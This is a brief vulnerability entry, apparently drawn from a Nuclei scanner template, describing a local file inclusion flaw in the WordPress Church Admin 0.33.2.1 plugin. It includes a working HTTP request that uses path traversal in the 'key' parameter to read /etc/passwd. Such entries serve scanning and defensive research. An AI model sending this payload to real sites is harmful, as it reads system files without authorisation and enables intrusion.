# Vulnerability: WordPress Church Admin 0.33.2.1 - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`church-admin-lfi.yaml`)

## Description
WordPress Church Admin 0.33.2.1 is vulnerable to local file inclusion via the "key" parameter of plugins/church-admin/display/download.php.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd
```

